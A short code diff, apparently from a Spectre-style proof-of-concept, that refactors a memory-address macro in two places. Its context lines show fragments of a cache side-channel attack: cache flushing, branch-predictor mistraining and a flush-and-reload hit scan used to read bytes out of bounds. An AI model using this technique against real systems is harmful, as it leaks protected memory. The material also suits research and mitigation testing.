@@ -65,7 +65,7 @@ void find_hits(int* results, size_t train_x)
     for (auto i = 0; i < MAX_BYTE; ++i)
     {
         int mix_i = MIX(i);
-        if ( is_hit(load(MEM_ADD(array2, mix_i*BLOCK_LEN))) && mix_i != array1[train_x] )
+        if ( is_hit(load(MEM_ADD(void*, array2, mix_i*BLOCK_LEN))) && mix_i != array1[train_x] )
         {
             results[mix_i]++;
         }
@@ -83,7 +83,7 @@ void readMemByte(size_t mal_x, uint8_t value[2], int score[2])
     {
         // Flush array2 from cache
         for (auto i = 0; i < MAX_BYTE; ++i)
-            flush(MEM_ADD(array2, i*BLOCK_LEN));
+            flush(MEM_ADD(void*, array2, i*BLOCK_LEN));
 
         // Mistrain the branch predictor
         size_t train_x = tries % array1_size;
